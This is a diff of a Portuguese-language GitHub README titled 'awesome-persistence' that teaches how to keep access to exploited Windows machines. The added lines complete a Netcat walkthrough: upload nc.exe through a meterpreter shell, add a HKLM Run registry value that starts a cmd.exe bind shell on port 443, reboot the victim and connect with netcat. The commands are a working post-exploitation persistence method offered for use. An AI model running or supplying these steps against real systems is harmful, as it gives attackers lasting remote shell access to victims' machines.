@@ -4,7 +4,7 @@
 
 **Técnicas e táticas para manutenção de persistência em um alvo explorado.**
 
-Eu sou o Stux e estarei constantemente atualizando este repositório com novas técnicas para alvos Windows!
+Eu sou o Stux e estarei constantemente atualizando este repositório com novas técnicas para Windows Persistence!
 
 ## Sumário
  - [Persistence Service](https://github.com/Stuuxx/awesome-persistence#persistence-service)
@@ -60,18 +60,28 @@ Já com o alvo explorado e com uma shell meterpreter:
 ```bash
 upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
 ```
-nc1.jpg
+![nc1](https://user-images.githubusercontent.com/67444297/198689309-274f2c78-f4f0-45b0-b2e8-4eb9884615a9.jpg)
 
 - Após realizado o upload, iremos modificar o registro para que o Netcat seja executado.
 ```bash
 reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e C:\windows\system32\cmd.exe'
 ```
-nc2.jpg
+![nc2](https://user-images.githubusercontent.com/67444297/198689312-33e81bea-6fec-43e7-bb09-fbe4b3c3bfea.jpg)
 
+- Agora, iremos verificar como ficou nossa modificação.
+```bash
+reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
+```
+![nc3](https://user-images.githubusercontent.com/67444297/198689313-1abd224e-cd03-4853-9958-65540a2cdb16.jpg)
 
+Para prova de conceito, iremos dar um reboot na máquina explorada para que nosso ataque seja efetivado nos registros do sistema.
+![nc4](https://user-images.githubusercontent.com/67444297/198689314-683654df-041d-453d-bec6-be6f419130ec.jpg)
 
-
-
+- Após o ataque ser bem sucedido, vamos nos conectar na máquina explorada através do netcat.
+```bash
+nc IP PORTA
+```
+![nc5](https://user-images.githubusercontent.com/67444297/198689315-99ce1fe9-5608-4374-b861-b48f09492a57.jpg)
 
 
 ### RDP
